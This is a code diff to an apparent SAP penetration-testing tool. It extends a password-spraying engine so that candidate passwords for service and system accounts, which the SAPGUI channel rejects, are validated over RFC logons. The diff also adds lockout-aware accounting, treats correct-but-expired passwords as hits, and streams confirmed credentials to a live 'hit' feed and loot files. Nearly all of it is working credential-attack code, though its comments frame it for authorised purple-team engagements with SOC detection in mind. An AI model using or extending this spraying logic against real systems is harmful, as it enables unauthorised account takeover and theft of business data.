@@ -91,6 +91,9 @@ MAX_CAP_PER_USER = 2
 DEFAULT_SLEEP_RANGE: Tuple[float, float] = (0.3, 0.9)
 # Inter-node sleep range (seconds, uniform random).
 DEFAULT_INTER_NODE_SLEEP: Tuple[float, float] = (1.0, 2.0)
+# Cap on the live hit-row feed carried in the polled /status payload
+# (the full set is always in the final run object + loot JSONL).
+_MAX_LIVE_HIT_ROWS = 200
 
 # Purple-mode DIAG terminal name — a deliberately-identifiable string
 # so SOC SIEM correlation rules on the Terminal field can latch onto
@@ -213,6 +216,12 @@ class SprayAttempt:
     terminal: str = ""
     pre_attempt_fail_counter: int = -1
     skipped_reason: str = ""
+    # Which auth channel produced the verdict: "diag" (SAPGUI) or
+    # "rfc" (service-user fallback, issue #106).  Lets the engagement
+    # report + hit matrix show HOW each hit was confirmed, and tells
+    # the SOC which detection signature to expect (RFC logon vs SAPGUI
+    # logon in SM21/SAL).
+    channel: str = "diag"
 
 
 @dataclass
@@ -255,8 +264,20 @@ class SprayConfig:
     # minimises failed-login audit noise per hit.
     early_exit_on_hit: bool = True
     # RFC fallback for NO_DIALOG_USER (system/comm users).  Requires
-    # NW RFC SDK available on the SAPMAP host.
+    # an RFC backend (NW RFC SDK or saprfclib) on the SAPMAP host.
+    # When DIAG returns NO_DIALOG_USER — SAP refusing the interactive
+    # channel for a SYSTEM/COMMUNICATION/SERVICE user (USTYP B/S/C)
+    # before it checks the password — the password can't be confirmed
+    # over DIAG.  An RFC logon DOES validate it, so the spray retries
+    # that single candidate over RFC (issue #106).
     rfc_fallback_for_service_users: bool = True
+    # Per-RFC-fallback-attempt watchdog bound (seconds).  The RFC open
+    # handshake can block at the TCP/SDK layer on an unreachable
+    # gateway; the spray loop bounds it with _run_with_watchdog so a
+    # dead co-tenant can't stall the sweep.  Larger than the DIAG
+    # attempt timeout because the RFC handshake + logon round-trip is
+    # heavier than a single DIAG socket exchange.
+    rfc_attempt_timeout_s: int = 10
     # ---- Responsiveness / cancellation (issue #121 follow-up) ----
     # Per-DIAG-attempt timeout (seconds) passed to try_login's socket.
     # Default 3 keeps the median attempt ~1-2s on reachable hosts;
@@ -738,6 +759,9 @@ def check_sprayed_credentials(
     tested_triples: Optional[Set[str]] = None,
     attempt_timeout_s: int = 5,
     on_pre_attempt: Optional[Callable[[SprayCandidate, str, int, int], None]] = None,
+    rfc_fallback_for_service_users: bool = True,
+    rfc_check_fn: Optional[Callable] = None,
+    rfc_attempt_timeout_s: int = 10,
 ) -> List[dict]:
     """Spray ``candidates`` against ``(host, port, each client)`` under
     the given lockout cap.  Generalisation of
@@ -774,9 +798,50 @@ def check_sprayed_credentials(
     # strings line up with every downstream classifier/UI expectation.
     from sap_default_creds import (
         SUCCESS, PASSWORD_CHANGE, NO_AUTH_LOGON,
-        USER_LOCKED, NO_DIALOG_USER,
+        USER_LOCKED, NO_DIALOG_USER, WRONG_PASSWORD,
     )
     HIT_CODES = {SUCCESS, PASSWORD_CHANGE, NO_AUTH_LOGON}
+
+    # RFC fallback wiring (issue #106).  The config toggle is
+    # authoritative: when disabled, force rfc_check_fn to None so an
+    # injected fn (or a lazy-loaded backend) can't fire — NO_DIALOG_USER
+    # then keeps its original DIAG-only "miss" verdict.  When enabled
+    # and no fn was injected, lazy-load the real RFC check (keeps the
+    # module importable without an RFC backend when only pool/DIAG
+    # logic is exercised; a missing backend leaves rfc_check_fn None).
+    if not rfc_fallback_for_service_users:
+        rfc_check_fn = None
+    elif rfc_check_fn is None:
+        try:
+            from sapmap_rfc import rfc_check_credentials as _real_rfc_check
+            rfc_check_fn = _real_rfc_check
+        except Exception:
+            logger.debug("RFC fallback unavailable — no rfc_check_fn",
+                         exc_info=True)
+            rfc_check_fn = None
+    # RFC result codes (string values match sap_default_creds on
+    # purpose so the engine treats DIAG + RFC verdicts uniformly).
+    _RFC_SUCCESS = "SUCCESS"
+    # Password correct but expired — a HIT (same as DIAG's
+    # PASSWORD_CHANGE), because the expiry rejection proves the
+    # password is right.
+    _RFC_PASSWORD_CHANGE = "PASSWORD_CHANGE"
+    _RFC_WRONG_PASSWORD = "WRONG_PASSWORD"
+    _RFC_USER_LOCKED = "USER_LOCKED"
+    _RFC_CONNECT_FAILED = "CONNECT_FAILED"
+
+    def _sysnr_for_port(p: int) -> str:
+        """Derive the 2-digit instance/sysnr from the dispatcher port
+        the spray targets (32NN -> NN).  RFC connects via ASHOST +
+        SYSNR; the SDK reaches the gateway (33NN) internally.  Clamp to
+        00..99 so an out-of-range port can't produce a bogus sysnr."""
+        try:
+            n = int(p) - 3200
+        except (TypeError, ValueError):
+            return "00"
+        if n < 0 or n > 99:
+            return "00"
+        return f"{n:02d}"
 
     pre_known_locked_users = {
         u.upper() for u in (pre_known_locked_users or set())}
@@ -832,10 +897,13 @@ def check_sprayed_credentials(
                        "source_sid": cand.source_sid,
                        "skipped_reason": "landscape_locked"})
                 continue
-            if uname_up in nodialog_users:
-                # Already observed NO_DIALOG_USER — don't burn more
-                # DIAG budget.  RFC fallback (if any) is the caller's
-                # job after this function returns.
+            if uname_up in nodialog_users and rfc_check_fn is None:
+                # Already observed NO_DIALOG_USER and no RFC fallback
+                # available — don't burn more DIAG budget on a user
+                # type DIAG can never validate.  (With a fallback we
+                # DO continue: the attempt block below routes this
+                # candidate straight to RFC, skipping the wasted DIAG
+                # round-trip — issue #106.)
                 continue
             # Short-circuit: user already hit on this client
             if early_exit_on_hit and uname_up in hit_users_per_client.get(
@@ -886,22 +954,35 @@ def check_sprayed_credentials(
                 except Exception:
                     logger.debug("on_pre_attempt callback raised",
                                  exc_info=True)
-            try:
-                result, detail = try_login_fn(
-                    host, port, client, cand.username, cand.password,
-                    saprouter=saprouter, terminal=terminal,
-                    timeout=attempt_timeout_s)
-            except TypeError:
-                # Older try_login signature w/o keyword args — retry
-                # positionally.  Keeps us robust against upstream
-                # refactor churn.
-                result, detail = try_login_fn(
-                    host, port, client, cand.username, cand.password)
+            # Known service user + RFC fallback available → skip the
+            # DIAG round-trip we already know returns NO_DIALOG_USER
+            # and let the branch below validate this password over RFC
+            # directly (issue #106).
+            if uname_up in nodialog_users and rfc_check_fn is not None:
+                result, detail = NO_DIALOG_USER, "service user (cached)"
+            else:
+                try:
+                    result, detail = try_login_fn(
+                        host, port, client, cand.username, cand.password,
+                        saprouter=saprouter, terminal=terminal,
+                        timeout=attempt_timeout_s)
+                except TypeError:
+                    # Older try_login signature w/o keyword args — retry
+                    # positionally.  Keeps us robust against upstream
+                    # refactor churn.
+                    result, detail = try_login_fn(
+                        host, port, client, cand.username, cand.password)
             row = {"user": cand.username, "password": cand.password,
                    "client": client, "result": result, "detail": detail,
                    "pw_sha256_prefix": _sha256_prefix(cand.password),
                    "source_kind": cand.source_kind,
-                   "source_sid": cand.source_sid}
+                   "source_sid": cand.source_sid,
+                   # Which channel produced this verdict — "diag" by
+                   # default, flipped to "rfc" by the fallback below so
+                   # the UI + report can show HOW each hit was
+                   # confirmed (and so the SOC sees the right
+                   # detection signature: RFC logon vs SAPGUI logon).
+                   "channel": "diag"}
             if result in HIT_CODES:
                 row["kind"] = "hit"
                 hit_users_per_client.setdefault(client, set()).add(uname_up)
@@ -912,9 +993,71 @@ def check_sprayed_credentials(
                 # Don't sleep after a lock — exit the inner loop fast
                 continue
             elif result == NO_DIALOG_USER:
-                row["kind"] = "miss"
-                row["skipped_reason"] = "no_dialog_user"
+                # DIAG refused the interactive channel for this user
+                # type (USTYP B/S/C) BEFORE checking the password, so
+                # the password is unconfirmed over DIAG.  Fall back to
+                # an RFC logon, which DOES validate it (issue #106).
                 nodialog_users.add(uname_up)
+                if rfc_check_fn is not None:
+                    # NOTE: a failed RFC logon bumps USR02.LOCNT.  The
+                    # attempts[akey] slot was already incremented for
+                    # this candidate above, and we do NOT increment
+                    # again — this RFC attempt consumes that one slot,
+                    # so a service-user candidate costs ONE slot against
+                    # the cap.  (Open question to verify on the lab:
+                    # whether the DIAG NO_DIALOG_USER refusal itself
+                    # bumps LOCNT.  If it does, a service-user candidate
+                    # costs two real increments and the cap should be
+                    # halved for service users in a follow-up.  We skip
+                    # the DIAG round-trip entirely for *cached*
+                    # nodialog users above, so only the FIRST password
+                    # per service user pays a DIAG attempt at all.)
+                    rfc_code, rfc_detail = _run_with_watchdog(
+                        rfc_check_fn,
+                        host, _sysnr_for_port(port), client,
+                        cand.username, cand.password,
+                        timeout_s=rfc_attempt_timeout_s,
+                        default=(_RFC_CONNECT_FAILED,
+                                 "rfc check timed out"),
+                        saprouter=saprouter,
+                        timeout=rfc_attempt_timeout_s)
+                    row["channel"] = "rfc"
+                    row["result"] = rfc_code
+                    row["detail"] = rfc_detail or row["detail"]
+                    if rfc_code in (_RFC_SUCCESS, _RFC_PASSWORD_CHANGE):
+                        # PASSWORD_CHANGE = correct-but-expired: the
+                        # expiry rejection confirms the password, so
+                        # it's a hit (parity with DIAG's HIT_CODES).
+                        row["kind"] = "hit"
+                        hit_users_per_client.setdefault(
+                            client, set()).add(uname_up)
+                    elif rfc_code == _RFC_USER_LOCKED:
+                        row["kind"] = "locked"
+                        locked_users.add(uname_up)
+                        _emit(row)
+                        continue
+                    elif rfc_code == _RFC_WRONG_PASSWORD:
+                        row["kind"] = "miss"
+                        row["skipped_reason"] = "rfc_wrong_password"
+                    else:
+                        # CONNECT_FAILED / ERROR — the RFC channel
+                        # couldn't give a credential verdict (gateway
+                        # unreachable, no SDK, timeout).  Keep the
+                        # service-user miss but record WHY we couldn't
+                        # confirm so the operator can retry those
+                        # specifically (e.g. open the gateway / install
+                        # the SDK) rather than assuming the password was
+                        # wrong.
+                        row["kind"] = "miss"
+                        row["skipped_reason"] = (
+                            "no_dialog_user_rfc_unreachable"
+                            if rfc_code == _RFC_CONNECT_FAILED
+                            else "no_dialog_user_rfc_unavailable")
+                else:
+                    # RFC fallback disabled or backend missing — keep
+                    # the original DIAG-only behaviour.
+                    row["kind"] = "miss"
+                    row["skipped_reason"] = "no_dialog_user"
             else:
                 row["kind"] = "miss"
             _emit(row)
@@ -1075,6 +1218,32 @@ def spray_landscape(
         manual_wordlist=config.manual_wordlist,
     )
     _append_log(f"pool: {len(pool)} candidate(s)")
+
+    # Resolve the RFC service-user fallback backend ONCE + log the
+    # outcome clearly, so the operator can SEE whether service/system
+    # users (USTYP B/S/C) will actually be validated this run.  Without
+    # this line a missing backend / disabled toggle silently left every
+    # NO_DIALOG_USER as a plain miss (operator-reported: a SYSTEM user
+    # that should have been confirmed over RFC never appeared in the
+    # hits, with no indication why).  Resolving here (not per-attempt)
+    # keeps the import off the hot path.
+    _rfc_fallback_fn = None
+    _rfc_fallback_active = False
+    if config.rfc_fallback_for_service_users:
+        try:
+            from sapmap_rfc import rfc_check_credentials as _rfc_fallback_fn
+            _rfc_fallback_active = True
+            _append_log("rfc service-user fallback: ENABLED "
+                        "(RFC backend ready)")
+        except Exception as e:
+            _rfc_fallback_fn = None
+            _append_log(
+                f"rfc service-user fallback: NO RFC backend available "
+                f"({type(e).__name__}: {e}) — service/system users "
+                f"(USTYP B/S/C) can't be password-validated this run")
+    else:
+        _append_log("rfc service-user fallback: disabled by operator")
+
     _set_phase("profile_probe")
     tm = build_target_matrix(state, scope_filter=scope_filter)
     targets: List[SprayTarget] = tm["eligible"]
@@ -1277,6 +1446,7 @@ def spray_landscape(
                 detail=row.get("detail", ""),
                 terminal=config.effective_terminal(),
                 skipped_reason=row.get("skipped_reason", ""),
+                channel=row.get("channel", "diag"),
             )
             if attempts_jsonl_path:
                 _append_attempt_jsonl(attempts_jsonl_path, attempt)
@@ -1351,7 +1521,14 @@ def spray_landscape(
             _kind = row.get("kind")
             if _kind in ("miss", "locked", "error"):
                 _res = row.get("result") or _kind.upper()
-                _append_log(f"    → {_res}")
+                # Tag the channel so a service-user verdict reached over
+                # RFC is distinguishable from a plain DIAG miss — e.g.
+                # "→ RFC: WRONG_PASSWORD" tells the operator the RFC
+                # fallback DID fire and the password was wrong, vs
+                # "→ NO_DIALOG_USER" which means the fallback never ran.
+                _chan_tag = ("RFC: " if row.get("channel") == "rfc"
+                             else "")
+                _append_log(f"    → {_chan_tag}{_res}")
             kind = row.get("kind")
             # Idempotency record (issue #69, PR5) — remember every
             # fired triple so a next-wave AutoPwn phase3b doesn't
@@ -1376,16 +1553,26 @@ def spray_landscape(
                     node._pwspray_tested_triples = set()
                 node._pwspray_tested_triples.add(_triple_key)
             if kind == "hit":
+                _channel = row.get("channel", "diag")
                 hit = {"sid": target.sid, "client": row.get("client"),
                        "user": row.get("user"),
                        "source_kind": row.get("source_kind"),
                        "source_sid": row.get("source_sid"),
-                       "result": row.get("result")}
+                       "result": row.get("result"),
+                       "channel": _channel}
                 run.hits.append(hit)
                 _status.hits = len(run.hits)
+                # Real-time hit feed for the progress panel — append the
+                # row now (not at run end) so the operator sees each
+                # confirmed credential the moment it lands.  Capped so
+                # the polled /status payload stays small.
+                _status.hit_rows.append(hit)
+                if len(_status.hit_rows) > _MAX_LIVE_HIT_ROWS:
+                    _status.hit_rows = _status.hit_rows[-_MAX_LIVE_HIT_ROWS:]
                 _append_log(
                     f"HIT {target.sid}/{row.get('client')} user="
-                    f"{row.get('user')} src={row.get('source_kind')}")
+                    f"{row.get('user')} src={row.get('source_kind')} "
+                    f"via={_channel}")
                 _upgrade_or_append_credential(node, dict(
                     username=row["user"], password=row["password"],
                     client=row["client"], instance_nr="",
@@ -1592,6 +1779,17 @@ def spray_landscape(
             tested_triples=(node._pwspray_tested_triples
                             if node._pwspray_tested_triples
                             else None),
+            # RFC fallback for service users (issue #106) — validates
+            # NO_DIALOG_USER (USTYP B/S/C) candidates over RFC, which
+            # DIAG can't confirm.  Gated by the operator-facing config
+            # toggle; bounded by its own watchdog timeout.
+            # Pass the pre-resolved backend (+ its active flag) so the
+            # engine doesn't re-import per target and so a missing
+            # backend correctly disables the fallback (active=False
+            # forces rfc_check_fn=None inside the engine).
+            rfc_fallback_for_service_users=_rfc_fallback_active,
+            rfc_check_fn=_rfc_fallback_fn,
+            rfc_attempt_timeout_s=config.rfc_attempt_timeout_s,
         )
         # Node summary tooltip
         node.spray_last_run = {
@@ -2315,6 +2513,12 @@ class PwSprayStatus:
     attempts_total: int = 0
     attempts_done: int = 0
     hits: int = 0
+    # Live hit rows (SID / client / user / result / channel), appended
+    # as each hit lands so the progress panel can show confirmed creds
+    # in REAL TIME instead of only in the final results modal.  Capped
+    # (see _MAX_LIVE_HIT_ROWS) so the polled /status payload stays
+    # small on a landscape with many hits.
+    hit_rows: List[dict] = field(default_factory=list)
     locks: int = 0
     skipped_count: int = 0
     aborted: str = ""
